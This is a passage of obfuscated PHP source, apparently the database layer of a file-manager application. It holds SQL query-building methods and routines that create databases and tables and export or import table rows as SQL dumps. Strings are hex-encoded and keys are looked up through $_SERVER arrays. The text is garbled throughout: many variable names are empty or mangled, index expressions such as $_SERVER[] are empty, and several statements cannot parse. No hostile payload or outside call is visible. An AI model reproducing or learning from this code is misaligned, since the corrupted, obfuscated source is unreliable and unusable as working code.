CacheLock::fileUnLock($[13]); return $غ; } public function execute($̏) { $ =& $_SERVER[]; if (!CacheLock::fileLock($[13])) { return !1; } $ֻ = parent::execute($̏); CacheLock::fileUnLock($[13]); return $ֻ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\156\145\161" => "\x3c\x3e", "\x67\164" => "\x3e", "\x65\147\x74" => "\x3e\x3d", "\x6c\164" => "\x3c", "\x65\154\x74" => "\x3c\75", "\156\157\x74\154\151\x6b\145" => "\116\x4f\x54\40\114\111\x4b\105", "\x6c\x69\153\145" => "\114\x49\113\105", "\151\156" => "\x49\116", "\x6e\157\x74\x69\156" => "\116\x4f\124\x20\111\116", "\156\x6f\x74\40\x69\156" => "\x4e\x4f\124\x20\x49\x4e", "\142\145\164\x77\145\145\156" => "\102\x45\124\127\105\105\x4e", "\x6e\x6f\164\142\x65\164\167\x65\145\156" => "\x4e\117\124\40\x42\105\124\127\x45\x45\x4e", "\x6e\x6f\x74\x20\142\x65\x74\167\x65\145\156" => "\116\x4f\124\40\102\105\x54\127\x45\x45\116"); protected $selectSql = "\x53\x45\114\x45\x43\124\x25\104\x49\123\124\111\116\x43\124\45\40\x25\106\111\105\114\x44\45\x20\x46\122\x4f\x4d\40\45\124\101\102\114\x45\45\45\x4a\x4f\x49\116\x25\x25\x57\110\x45\122\x45\x25\x25\107\x52\117\125\120\45\x25\x48\101\126\111\116\107\x25\45\117\x52\104\105\x52\x25\x25\114\x49\x4d\111\124\45\x20\x25\x55\116\x49\x4f\116\45\x25\x43\117\115\115\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $щ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[][999], $щ); } public function factory($ҳ = '') { $Ҭ =& $_SERVER[]; $ҳ = $this->parseConfig($ҳ); if (empty($ҳ[$Ҭ[1000]])) { think_exception(think_lang($Ҭ[1001])); } $this->dbType = ucwords(strtolower($ҳ[$Ҭ[1000]])); $ = $Ҭ[1002] . $this->dbType; if (class_exists($)) { $ = new $($ҳ); if ($Ҭ[1003] != strtolower($ҳ[$Ҭ[1000]])) { $->dbType = strtoupper($this->dbType); } else { $->dbType = $this->_getDsnType($ҳ[$Ҭ[955]]); } } else { think_exception(think_lang($Ҭ[1004]) . $Ҭ[1005] . $); } return $; } public function __call($Ï, $) { if (method_exists($this, $Ï)) { return call_user_func_array(array($this, $Ï), $); } } protected function _getDsnType($ҷ) { $ˀ = explode($_SERVER[][4], $ҷ); $È = strtoupper(trim($ˀ[0])); return $È; } private function parseConfig($Ǯޚ = '') { $ܷ޵ =& $_SERVER[]; if (!empty($Ǯޚ) && is_string($Ǯޚ)) { $Ǯޚ = $this->parseDSN($Ǯޚ); } elseif (is_array($Ǯޚ)) { $Ǯޚ = array_change_key_case($Ǯޚ); $Ǯޚ = array($ܷ޵[1000] => $Ǯޚ[$ܷ޵[1006]], $ܷ޵[927] => $Ǯޚ[$ܷ޵[1007]], $ܷ޵[928] => $Ǯޚ[$ܷ޵[1008]], $ܷ޵[925] => $Ǯޚ[$ܷ޵[1009]], $ܷ޵[926] => $Ǯޚ[$ܷ޵[1010]], $ܷ޵[21] => $Ǯޚ[$ܷ޵[1011]], $ܷ޵[955] => $Ǯޚ[$ܷ޵[1012]], $ܷ޵[17] => isset($Ǯޚ[$ܷ޵[1013]]) ? $Ǯޚ[$ܷ޵[1013]] : array()); } elseif (empty($Ǯޚ)) { if (think_config($ܷ޵[1014]) && $ܷ޵[1003] != strtolower(think_config($ܷ޵[1015]))) { $Ǯޚ = $this->parseDSN(think_config($ܷ޵[1014])); } else { $Ǯޚ = array($ܷ޵[1000] => think_config($ܷ޵[1015]), $ܷ޵[927] => think_config($ܷ޵[1016]), $ܷ޵[928] => think_config($ܷ޵[1017]), $ܷ޵[925] => think_config($ܷ޵[1018]), $ܷ޵[926] => think_config($ܷ޵[1019]), $ܷ޵[21] => think_config($ܷ޵[290]), $ܷ޵[955] => think_config($ܷ޵[1014]), $ܷ޵[17] => think_config($ܷ޵[1020])); } } return $Ǯޚ; } protected function initConnect($ = true) { if (1 == think_config($_SERVER[][22])) { $this->_linkID = $this->multiConnect($); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ => $櫙) { $this->_linkID = $櫙; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ɗʇ = false) { $᫂ =& $_SERVER[]; static $Γ = array(); static $򆷭 = -1; if (empty($Γ)) { foreach ($this->config as $ => $ؒ) { $Γ[$] = explode($᫂[50], $ؒ); } } if (think_config($᫂[1021])) { if ($ɗʇ || think_config($᫂[439]) === !0) { $̲͸ = floor(mt_rand(0, think_config($᫂[1022]) - 1)); $򆷭 = $̲͸; } else { if (is_numeric(think_config($᫂[1023]))) { $̲͸ = think_config($᫂[1023]); } else { $̲͸ = floor(mt_rand(think_config($᫂[1022]), count($Γ[$᫂[925]]) - 1)); } } } else { $̲͸ = floor(mt_rand(0, count($Γ[$᫂[925]]) - 1)); $򆷭 = $̲͸; } $̲͸ = $򆷭 !== -1 ? $򆷭 : $̲͸; $Θ = array($᫂[927] => isset($Γ[$᫂[927]][$̲͸]) ? $Γ[$᫂[927]][$̲͸] : $Γ[$᫂[927]][0], $᫂[928] => isset($Γ[$᫂[928]][$̲͸]) ? $Γ[$᫂[928]][$̲͸] : $Γ[$᫂[928]][0], $᫂[925] => isset($Γ[$᫂[925]][$̲͸]) ? $Γ[$᫂[925]][$̲͸] : $Γ[$᫂[925]][0], $᫂[926] => isset($Γ[$᫂[926]][$̲͸]) ? $Γ[$᫂[926]][$̲͸] : $Γ[$᫂[926]][0], $᫂[21] => isset($Γ[$᫂[21]][$̲͸]) ? $Γ[$᫂[21]][$̲͸] : $Γ[$᫂[21]][0], $᫂[955] => isset($Γ[$᫂[955]][$̲͸]) ? $Γ[$᫂[955]][$̲͸] : $Γ[$᫂[955]][0], $᫂[17] => isset($Γ[$᫂[17]][$̲͸]) ? $Γ[$᫂[17]][$̲͸] : $Γ[$᫂[17]][0]); return $this->connect($Θ, $̲͸); } public function parseDSN($˫Đ) { $؋Ǟ =& $_SERVER[]; if (empty($˫Đ)) { return !1; } $ї = parse_url($˫Đ); if ($ї[$؋Ǟ[195]]) { $ = array($؋Ǟ[1000] => $ї[$؋Ǟ[195]], $؋Ǟ[927] => isset($ї[$؋Ǟ[630]]) ? $ї[$؋Ǟ[630]] : $؋Ǟ[12], $؋Ǟ[928] => isset($ї[$؋Ǟ[1024]]) ? $ї[$؋Ǟ[1024]] : $؋Ǟ[12], $؋Ǟ[925] => isset($ї[$؋Ǟ[196]]) ? $ї[$؋Ǟ[196]] : $؋Ǟ[12], $؋Ǟ[926] => isset($ї[$؋Ǟ[197]]) ? $ї[$؋Ǟ[197]] : $؋Ǟ[12], $؋Ǟ[21] => isset($ї[$؋Ǟ[84]]) ? substr($ї[$؋Ǟ[84]], 1) : $؋Ǟ[12]); } else { preg_match($؋Ǟ[1025], trim($˫Đ), $ƿ); $ = array($؋Ǟ[1000] => $ƿ[1], $؋Ǟ[927] => $ƿ[2], $؋Ǟ[928] => $ƿ[3], $؋Ǟ[925] => $ƿ[4], $؋Ǟ[926] => $ƿ[5], $؋Ǟ[21] => $ƿ[6]); } $[$؋Ǟ[955]] = $؋Ǟ[12]; return $; } protected function debug() { $ᇸ =& $_SERVER[]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ᇸ[1026]; if (think_config($ᇸ[1027])) { think_status($ᇸ[1028]); think_trace($this->queryStr . $ᇸ[1029] . think_status($ᇸ[24], $ᇸ[1028], 6) . $ᇸ[1030], $ᇸ[12], $ᇸ[1031]); } } protected function parseLock($ = false) { $ =& $_SERVER[]; if (!$) { return $[12]; } if ($[957] == $this->dbType) { return $[1032]; } return $[1033]; } protected function parseSet($) { $ڎɍ =& $_SERVER[]; foreach ($ as $ඹ => $۩ò) { if (is_array($۩ò) && $ڎɍ[341] == $۩ò[0]) { $[] = $this->parseKey($ඹ) . $ڎɍ[923] . $۩ò[1]; } elseif (is_scalar($۩ò) || is_null($۩ò)) { $[] = $this->parseKey($ඹ) . $ڎɍ[923] . $this->parseValue($۩ò); } } return $ڎɍ[1034] . implode($ڎɍ[50], $); } protected function bindParam($ǯ, $ڈɟ) { $this->bind[$_SERVER[][4] . $ǯ] = $ڈɟ; } protected function parseBind($ۍﰟ) { $ۍﰟ = array_merge($this->bind, $ۍﰟ); $this->bind = array(); return $ۍﰟ; } function parseKey(&$, $ = true) { if ($) { $ = $this->parseKeyCheck($); } return $; } function parseKeyCheck($) { $囡 =& $_SERVER[]; $ = trim($); if (!preg_match($囡[1035], $)) { think_exception($囡[1036] . $); } return $; } protected function parseValue($Ӿ) { $᝺ =& $_SERVER[]; if (is_string($Ӿ)) { $Ӿ = $᝺[996] . $this->escapeString($Ӿ) . $᝺[996]; } elseif (isset($Ӿ[0]) && is_string($Ӿ[0]) && strtolower($Ӿ[0]) == $᝺[341]) { $Ӿ = $this->escapeString($Ӿ[1]); } elseif (is_array($Ӿ)) { $Ӿ = array_map(array($this, $᝺[997]), $Ӿ); } elseif (is_bool($Ӿ)) { $Ӿ = $Ӿ ? $᝺[88] : $᝺[212]; } elseif (is_null($Ӿ)) { $Ӿ = $᝺[103]; } return $Ӿ; } protected function parseField($) { $ =& $_SERVER[]; if (is_string($) && strpos($, $[50])) { $ = explode($[50], $); } if (is_array($)) { $ = array(); foreach ($ as $ => $Ң) { if (!is_numeric($)) { $[] = $this->parseKey($, !1) . $[1037] . $this->parseKey($Ң); } else { $[] = $this->parseKey($Ң); } } $ = implode($[50], $); } elseif (is_string($) && !empty($)) { $ = $; } else { $ = $[203]; } return $; } protected function parseTable($ӵÑ) { $ =& $_SERVER[]; if (is_array($ӵÑ)) { $䷐ = array(); foreach ($ӵÑ as $ => $ǭ) { if (!is_numeric($)) { $䷐[] = $this->parseKey($) . $[53] . $this->parseKey($ǭ); } else { $䷐[] = $this->parseKey($); } } $ӵÑ = $䷐; } elseif (is_string($ӵÑ)) { if (strstr($ӵÑ, $[53])) { return $ӵÑ; } $ӵÑ = explode($[50], $ӵÑ); array_walk($ӵÑ, array($this, $[945])); } return $[939] . trim(implode($[1038], $ӵÑ), $[429]) . $[939]; } protected function parseWhere($߆) { $ί =& $_SERVER[]; $οؒ = $ί[12]; if (is_string($߆)) { $οؒ = $߆; } else { $Ќ = isset($߆[$ί[1039]]) ? strtoupper($߆[$ί[1039]]) : $ί[12]; if (in_array($Ќ, array($ί[1040], $ί[1041], $ί[1042]))) { $Ќ = $ί[53] . $Ќ . $ί[53]; unset($߆[$ί[1039]]); } else { $Ќ = $ί[1043]; } foreach ($߆ as $֧ => $) { $οؒ .= $ί[321]; if (is_numeric($֧)) { $֧ = $ί[1044]; } if (0 === strpos($֧, $ί[11])) { $οؒ .= $this->parseThinkWhere($֧, $); } else { if (!preg_match($ί[1045], trim($֧))) { think_exception(think_lang($ί[1046]) . $ί[4] . $֧); } $ = is_array($) && isset($[$ί[1047]]); $֧ = trim($֧); if (strpos($֧, $ί[327])) { $ԣ = explode($ί[327], $֧); $籄 = array(); foreach ($ԣ as $Г => $Ǹ) { $̃Ę = $ ? $[$Г] : $; $籄[] = $ί[304] . $this->parseWhereItem($this->parseKey($Ǹ), $̃Ę) . $ί[944]; } $οؒ .= implode($ί[1048], $籄); } elseif (strpos($֧, $ί[328])) { $ԣ = explode($ί[328], $֧); $籄 = array(); foreach ($ԣ as $Г => $Ǹ) { $̃Ę = $ ? $[$Г] : $; $籄[] = $ί[304] . $this->parseWhereItem($this->parseKey($Ǹ), $̃Ę) . $ί[944]; } $οؒ .= implode($ί[1043], $籄); } else { $οؒ .= $this->parseWhereItem($this->parseKey($֧), $); } } $οؒ .= $ί[322] . $Ќ; } $οؒ = substr($οؒ, 0, -strlen($Ќ)); } return empty($οؒ) ? $ί[12] : $ί[1049] . $οؒ; } protected function parseWhereItem($, $) { $Ռ =& $_SERVER[]; $ = $Ռ[12]; if (is_array($)) { if (is_string($[0])) { $ސ = strtolower($[0]); if (in_array($[0], array($Ռ[923], $Ռ[1050], $Ռ[1051], $Ռ[1052], $Ռ[1053], $Ռ[1054]))) { $ .= $ . $Ռ[53] . $[0] . $Ռ[53] . $this->parseValue($[1]); } elseif (preg_match($Ռ[1055], $[0])) { $ .= $ . $Ռ[53] . $this->exp[$ސ] . $Ռ[53] . $this->parseValue($[1]); } elseif (preg_match($Ռ[1056], $[0])) { if (is_array($[1])) { $ = isset($[2]) ? strtoupper($[2]) : $Ռ[1041]; if (in_array($, array($Ռ[1040], $Ռ[1041], $Ռ[1042]))) { $ = array(); foreach ($[1] as $ԫ) { $[] = $ . $Ռ[53] . $this->exp[$ސ] . $Ռ[53] . $this->parseValue($ԫ); } $ .= $Ռ[304] . implode($Ռ[53] . $ . $Ռ[53], $) . $Ռ[944]; } } else { $ .= $ . $Ռ[53] . $this->exp[$ސ] . $Ռ[53] . $this->parseValue($[1]); } } elseif ($Ռ[341] == $ސ) { $ .= $Ռ[942] . $ . $Ռ[53] . $[1] . $Ռ[1057]; } elseif (preg_match($Ռ[1058], $[0])) { $ .= $[0]; } elseif (preg_match($Ռ[1059], $[0])) { if (isset($[2]) && $Ռ[341] == $[2]) { $ .= $ . $Ռ[53] . $this->exp[$ސ] . $Ռ[53] . $[1]; } else { if (is_string($[1])) { $[1] = explode($Ռ[50], $[1]); } $ڞˋ = implode($Ռ[50], $this->parseValue($[1])); $ .= $ . $Ռ[53] . $this->exp[$ސ] . $Ռ[942] . $ڞˋ . $Ռ[944]; } } elseif (preg_match($Ռ[1060], $[0])) { $ = is_string($[1]) ? explode($Ռ[50], $[1]) : $[1]; $ .= $Ռ[942] . $ . $Ռ[53] . $this->exp[$ސ] . $Ռ[53] . $this->parseValue($[0]) . $Ռ[1043] . $this->parseValue($[1]) . $Ռ[322]; } else { think_exception(think_lang($Ռ[1046]) . $Ռ[4] . $[0]); } } else { $ = count($); $آ = $Ռ[12]; if (is_string($[$ - 1])) { $آ = isset($[$ - 1]) ? strtoupper($[$ - 1]) : $Ռ[12]; if (in_array($آ, array($Ռ[1040], $Ռ[1041], $Ռ[1042]))) { $ = $ - 1; } } else { $آ = $Ռ[1040]; } for ($஍ = 0; $஍ < $; $஍++) { $ = is_array($[$஍]) ? $[$஍][1] : $[$஍]; if ($Ռ[341] == strtolower($[$஍][0])) { $ .= $Ռ[304] . $ . $Ռ[53] . $ . $Ռ[1057] . $آ . $Ռ[53]; } else { $ɾ = is_array($[$஍]) ? $this->exp[strtolower($[$஍][0])] : $Ռ[923]; if (!$ɾ && is_array($[$஍]) && in_array($[$஍][0], array($Ռ[923], $Ռ[1050], $Ռ[1051], $Ռ[1052], $Ռ[1053], $Ռ[1054]))) { $ɾ = $[$஍][0]; } $ .= $Ռ[304] . $ . $Ռ[53] . $ɾ . $Ռ[53] . $this->parseValue($) . $Ռ[1057] . $آ . $Ռ[53]; } } $ = substr($, 0, -4); } } else { $ .= $ . $Ռ[1061] . $this->parseValue($); } return $; } protected function parseThinkWhere($⑸, $Ι) { $ƭ =& $_SERVER[]; $݈ = $ƭ[12]; switch ($⑸) { case $ƭ[396]: $݈ = $Ι; break; case $ƭ[1044]: $݈ = is_string($Ι) ? $Ι : substr($this->parseWhere($Ι), 6); break; case $ƭ[1062]: parse_str($Ι, $߀Թ); if (isset($߀Թ[$ƭ[1039]])) { $ķ = $ƭ[53] . strtoupper($߀Թ[$ƭ[1039]]) . $ƭ[53]; unset($߀Թ[$ƭ[1039]]); } else { $ķ = $ƭ[1043]; } $ʵ = array(); foreach ($߀Թ as $ => $ϊ) { $ʵ[] = $this->parseKey($) . $ƭ[1061] . $this->parseValue($ϊ); } $݈ = implode($ķ, $ʵ); break; } return $݈; } protected function parseLimit($) { $ԋ짚 =& $_SERVER[]; return !empty($) ? $ԋ짚[51] . $ . $ԋ짚[53] : $ԋ짚[12]; } protected function parseJoin($) { $㝦 =& $_SERVER[]; $Ǣ = $㝦[12]; if (!empty($)) { if (is_array($)) { foreach ($ as $ => $۲) { if (!1 !== stripos($۲, $㝦[1063])) { $Ǣ .= $㝦[53] . $۲; } else { $Ǣ .= $㝦[1064] . $۲; } } } else { $Ǣ .= $㝦[1064] . $; } } $Ǣ = preg_replace($㝦[1065], think_config($㝦[969]) . $㝦[1066], $Ǣ); return $Ǣ; } protected function parseOrder($К) { $ =& $_SERVER[]; if (is_array($К)) { $䷊ = array(); foreach ($К as $ԑ => $) { if (is_numeric($ԑ)) { $䷊[] = $this->parseKey($); } else { $ = in_array(strtoupper(trim($)), array($[1067], $[1068])) ? $[53] . $ : $[12]; if (preg_match($[1069], $ԑ)) { $䷊[] = $this->parseKey($ԑ) . $; } else { think_exception($[1070] . $ԑ); } } } $К = implode($[50], $䷊); } return !empty($К) ? $[1071] . $К : $[12]; } protected function parseGroup($) { $ߡ =& $_SERVER[]; return !empty($) ? $ߡ[1072] . $ : $ߡ[12]; } protected function parseHaving($) { $Մ =& $_SERVER[]; return !empty($) ? $Մ[1073] . $ : $Մ[12]; } protected function parseComment($𚥓) { $Է =& $_SERVER[]; return !empty($𚥓) ? $Է[1074] . $𚥓 . $Է[1075] : $Է[12]; } protected function parseDistinct($౹) { $ɴ =& $_SERVER[]; return !empty($౹) ? $ɴ[1076] : $ɴ[12]; } protected function parseUnion($) { $͡ =& $_SERVER[]; if (empty($)) { return $͡[12]; } if (isset($[$͡[392]])) { $Ī = $͡[1077]; unset($[$͡[392]]); } else { $Ī = $͡[1078]; } foreach ($ as $ߟ) { $掛[] = $Ī . (is_array($ߟ) ? $this->buildSelectSql($ߟ) : $ߟ); } return implode($͡[53], $掛); } public function insert($, $ = array(), $𝄎̛ = false) { $ =& $_SERVER[]; $Ú = $ռ = array(); $this->model = $[$[325]]; foreach ($ as $ => $¥) { if (is_array($¥) && $[341] == $¥[0]) { $ռ[] = $this->parseKey($); $Ú[] = $¥[1]; } elseif (is_scalar($¥) || is_null($¥)) { $ռ[] = $this->parseKey($); $Ú[] = $this->parseValue($¥); } } $ = ($𝄎̛ ? $[946] : $[947]) . $[948] . $this->parseTable($[$[323]]) . $[942] . implode($[50], $ռ) . $[943] . implode($[50], $Ú) . $[944]; $ .= $this->parseLock(isset($[$[878]]) ? $[$[878]] : !1); $ .= $this->parseComment(!empty($[$[398]]) ? $[$[398]] : $[12]); return $this->execute($, $this->parseBind(!empty($[$[329]]) ? $[$[329]] : array())); } public function selectInsert($炴, $َ, $ = array()) { $ꐟ =& $_SERVER[]; $this->model = $[$ꐟ[325]]; if (is_string($炴)) { $炴 = explode($ꐟ[50], $炴); } array_walk($炴, array($this, $ꐟ[945])); $ӹ = $ꐟ[1079] . $this->parseTable($َ) . $ꐟ[942] . implode($ꐟ[50], $炴) . $ꐟ[1057]; $ӹ .= $this->buildSelectSql($); return $this->execute($ӹ, $this->parseBind(!empty($[$ꐟ[329]]) ? $[$ꐟ[329]] : array())); } public function update($󕘦, $Ӥ) { $Ә =& $_SERVER[]; $this->model = $Ӥ[$Ә[325]]; $˻ = $Ә[1080] . $this->parseTable($Ӥ[$Ә[323]]) . $this->parseSet($󕘦) . $this->parseWhere(!empty($Ӥ[$Ә[319]]) ? $Ӥ[$Ә[319]] : $Ә[12]) . $this->parseOrder(!empty($Ӥ[$Ә[409]]) ? $Ӥ[$Ә[409]] : $Ә[12]) . $this->parseLimit(!empty($Ӥ[$Ә[336]]) ? $Ӥ[$Ә[336]] : $Ә[12]) . $this->parseLock(isset($Ӥ[$Ә[878]]) ? $Ӥ[$Ә[878]] : !1) . $this->parseComment(!empty($Ӥ[$Ә[398]]) ? $Ӥ[$Ә[398]] : $Ә[12]); return $this->execute($˻, $this->parseBind(!empty($Ӥ[$Ә[329]]) ? $Ӥ[$Ә[329]] : array())); } public function delete($Є = array()) { $嵠 =& $_SERVER[]; $this->model = $Є[$嵠[325]]; $ܥ = $嵠[1081] . $this->parseTable($Є[$嵠[323]]) . $this->parseWhere(!empty($Є[$嵠[319]]) ? $Є[$嵠[319]] : $嵠[12]) . $this->parseOrder(!empty($Є[$嵠[409]]) ? $Є[$嵠[409]] : $嵠[12]) . $this->parseLimit(!empty($Є[$嵠[336]]) ? $Є[$嵠[336]] : $嵠[12]) . $this->parseLock(isset($Є[$嵠[878]]) ? $Є[$嵠[878]] : !1) . $this->parseComment(!empty($Є[$嵠[398]]) ? $Є[$嵠[398]] : $嵠[12]); return $this->execute($ܥ, $this->parseBind(!empty($Є[$嵠[329]]) ? $Є[$嵠[329]] : array())); } public function select($̋Β = array()) { $ =& $_SERVER[]; $this->model = $̋Β[$[325]]; $ς = $this->buildSelectSql($̋Β); $ݠ = isset($̋Β[$[393]]) ? $̋Β[$[393]] : !1; if ($ݠ) { $倭ܧ = is_string($ݠ[$[94]]) ? $ݠ[$[94]] : $[1082] . md5($ς); $ = think_cache($倭ܧ, $[12], $ݠ); if (!1 !== $) { return $; } } $Խ = $this->query($ς, $this->parseBind(!empty($̋Β[$[329]]) ? $̋Β[$[329]] : array())); if ($ݠ && !1 !== $Խ) { think_cache($倭ܧ, $Խ, $ݠ); } return $Խ; } public function buildSelectSql($ڱ = array()) { $ʎ =& $_SERVER[]; if (isset($ڱ[$ʎ[397]])) { if (strpos($ڱ[$ʎ[397]], $ʎ[50])) { list($Ӕ, $󑹆) = explode($ʎ[50], $ڱ[$ʎ[397]]); } else { $Ӕ = $ڱ[$ʎ[397]]; } $Ӕ = $Ӕ ? $Ӕ : 1; $󑹆 = isset($󑹆) ? $󑹆 : (is_numeric($ڱ[$ʎ[336]]) ? $ڱ[$ʎ[336]] : 20); $Ā = $󑹆 * ((int) $Ӕ - 1); $ڱ[$ʎ[336]] = $Ā . $ʎ[50] . $󑹆; } if (think_config($ʎ[1083])) { $ = $ʎ[1084] . md5(serialize($ڱ)); $ = think_cache($); if ($) { return $; } } $׫簔 = $this->parseSql($this->selectSql, $ڱ); $׫簔 .= $this->parseLock(isset($ڱ[$ʎ[878]]) ? $ڱ[$ʎ[878]] : !1); if (isset($)) { think_cache($, $׫簔); } return $׫簔; } public function parseSql($ٽ, $ۯ = array()) { $ӽ΁ =& $_SERVER[]; $ٽ = str_replace(array($ӽ΁[1085], $ӽ΁[1086], $ӽ΁[1087], $ӽ΁[1088], $ӽ΁[1089], $ӽ΁[1090], $ӽ΁[1091], $ӽ΁[1092], $ӽ΁[1093], $ӽ΁[1094], $ӽ΁[1095]), array($this->parseTable("{$ۯ[$ӽ΁[323]]}"), $this->parseDistinct(isset($ۯ[$ӽ΁[1096]]) ? $ۯ[$ӽ΁[1096]] : !1), $this->parseField(!empty($ۯ[$ӽ΁[317]]) ? $ۯ[$ӽ΁[317]] : $ӽ΁[203]), $this->parseJoin(!empty($ۯ[$ӽ΁[326]]) ? $ۯ[$ӽ΁[326]] : $ӽ΁[12]), $this->parseWhere(!empty($ۯ[$ӽ΁[319]]) ? $ۯ[$ӽ΁[319]] : $ӽ΁[12]), $this->parseGroup(!empty($ۯ[$ӽ΁[547]]) ? $ۯ[$ӽ΁[547]] : $ӽ΁[12]), $this->parseHaving(!empty($ۯ[$ӽ΁[1097]]) ? $ۯ[$ӽ΁[1097]] : $ӽ΁[12]), $this->parseOrder(!empty($ۯ[$ӽ΁[409]]) ? $ۯ[$ӽ΁[409]] : $ӽ΁[12]), $this->parseLimit(!empty($ۯ[$ӽ΁[336]]) ? $ۯ[$ӽ΁[336]] : $ӽ΁[12]), $this->parseUnion(!empty($ۯ[$ӽ΁[391]]) ? $ۯ[$ӽ΁[391]] : $ӽ΁[12]), $this->parseComment(!empty($ۯ[$ӽ΁[398]]) ? $ۯ[$ӽ΁[398]] : $ӽ΁[12])), $ٽ); return $ٽ; } public function getLastSql($ = '') { return $ ? $this->modelSql[$] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ЉТ) { return addslashes($ЉТ); } public function setModel($ꋩ) { $this->model = $ꋩ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Ϧ = array()) { $پ =& $_SERVER[]; if (empty($Ϧ)) { $Ϧ = $GLOBALS[$پ[6]][$پ[21]]; } $this->database = $Ϧ; } public function model($놪 = '') { return new ModelBase($놪, $_SERVER[][12], $this->database); } public function db($ک = false) { $݌՘ =& $_SERVER[]; $ޣ = array_change_key_case($this->database); if ($this->dbType() == $݌՘[13] || !$ک) { return $this->model()->db(); } $ԟ = $ޣ[$݌՘[1011]]; $ޣ[$݌՘[1011]] = $݌՘[12]; if ($ޣ[$݌՘[1006]] == $݌՘[1003]) { $ё = $ޣ[$݌՘[1012]]; $ޣ[$݌՘[1012]] = substr($ё, 0, strrpos($ё, $݌՘[1098])); } $this->database = $ޣ; $ = $this->model()->db(); try { $˱⎿ = $->execute("\x73\150\157\x77\40\x64\141\164\x61\142\141\x73\x65\x73\40\154\x69\x6b\145\40\47{$ԟ}\47"); } catch (Exception $) { } if (!$˱⎿) { $->execute("\143\x72\145\141\164\x65\40\x64\141\x74\x61\x62\x61\163\145\x20\x60{$ԟ}\x60"); } $ޣ[$݌՘[1011]] = $ԟ; if ($ޣ[$݌՘[1006]] == $݌՘[1003]) { $ޣ[$݌՘[1012]] .= $݌՘[1098] . $ԟ; } $this->database = $ޣ; $->execute("\x75\x73\145\40\140{$ԟ}\140"); return $; } public function createTable($ѳ, &$҂) { $⭽ =& $_SERVER[]; if (!IO::exist($ѳ)) { ActionCall($⭽[1099], !0, 0); show_json(LNG($⭽[1100]), !1); } $˽ = $this->model()->db(); $ = sqlSplit(IO::getContent($ѳ)); foreach ($ as $ձ) { $ɒ = stripos($ձ, $⭽[1101]) === 0; if ($ɒ) { $҂->task[$⭽[820]] += 1; } $˽->execute($ձ); if ($ɒ) { preg_match($⭽[1102], $ձ, $ꩀ); $҂->task[$⭽[1103]] = $ꩀ[1]; $҂->update(1); } } } public function insertTable($ϵ, &$ʮ) { $ށè =& $_SERVER[]; $ᴟ = $this->model()->db(); $Ƃ = $ ? array($) : $ᴟ->getTables(); foreach ($ϵ as $) { $ = basename($, $ށè[822]); if (!in_array($, $Ƃ)) { continue; } $ʮ->task[$ށè[1103]] = $; if (get_filesize($) == 0) { continue; } $آ = $this->sqlToDb($, $ʮ); if (!$آ) { ActionCall($ށè[1099], !0, 0); show_json(LNG($ށè[1104]) . "\x5b{$}\x5d", !1); } } } public function sqlFromDb($Š, $, &$, $۟Ѕ = '') { if ($) { $->task[$_SERVER[][1103]] = $Š; } $ґȷ = $this->model($Š); $솧 = 0; $ = 0; $ = 10000; $ = fopen($, $_SERVER[][1105]); $ќ = $ґȷ->getPk(); $Ч = $ґȷ->getDbFields(); $ɯ = $_SERVER[][12]; if ($GLOBALS[$_SERVER[][821]] && in_array($Š, array($_SERVER[][1106], $_SERVER[][1107]))) { $ɯ = $Š; } do { $Ƣ = array($ќ => array($_SERVER[][1053], $)); $ = $ґȷ->where($Ƣ)->field($Ч)->order($ќ . $_SERVER[][1108])->limit($)->select(); $ = !empty($) ? $ : array(); if (!($ = count($))) { break; } $МȨ = end($); $ = $МȨ[$ќ]; $ = array(); foreach ($ as $ܡ) { if ($ɯ) { if ($Š == $_SERVER[][1106]) { if ($ܡ[$_SERVER[][33]] == $_SERVER[][1109]) { $ = json_decode($ܡ[$_SERVER[][418]], !0); if ($[$_SERVER[][32]] == $GLOBALS[$_SERVER[][821]] && $[$_SERVER[][784]] != 1) { continue; } } } else { if ($ܡ[$_SERVER[][33]] == $_SERVER[][1110] && $ܡ[$_SERVER[][94]] == $_SERVER[][813]) { continue; } } } if ($۟Ѕ) { $ܡ[$_SERVER[][84]] = "\x7b\151\157\72{$۟Ѕ}\175" . substr($ܡ[$_SERVER[][84]], strlen("\x7b\151\x6f\x3a{$ܡ[$_SERVER[][851]]}\x7d")); $ܡ[$_SERVER[][851]] = $۟Ѕ; } $[] = $_SERVER[][1111] . $this->sqlEncode($ܡ) . $_SERVER[][1112]; } $Ӻ盍 = "\x49\x4e\123\105\x52\124\40\111\x4e\124\117\x20\x60{$Š}\140\x20\50\x60" . implode($_SERVER[][1113], $Ч) . $_SERVER[][1114]; fwrite($, $Ӻ盍 . implode($_SERVER[][1115], $) . $_SERVER[][71] . PHP_EOL); $솧 += $; if ($) { $->update($); } } while ($ == $); fclose($); return $솧; } public function sqlToDb($ԑƧ, &$ےه) { $Х =& $_SERVER[]; $ = $this->model()->db(); $ڪ = @fopen($ԑƧ, $Х[1116]); if (!$ڪ) { return !1; } $쿹 = 0; $ۉ = $Х[12]; $ = array(); $浰 = $this->dbType(); $ = $浰 == $Х[13] ? 500 : 2000; $ = basename($ԑƧ, $Х[822]); $Ũ߯ = 0; $߈ = 4194304 - 104858; $ = 1000000 - 104858; while (!feof($ڪ)) { $ô = trim(fgets($ڪ)); if (!$ô) { continue; } $˺Ϟ = $this->sqlDecode($ô, $浰, $); if (stripos($˺Ϟ, $Х[399]) === 0) { if (!$ۉ) { $ۉ = $˺Ϟ . $Х[53]; } continue; } if ($ےه) { $ےه->task[$Х[820]] += 1; } $쿹++; $[] = rtrim(rtrim(trim($˺Ϟ), $Х[50]), 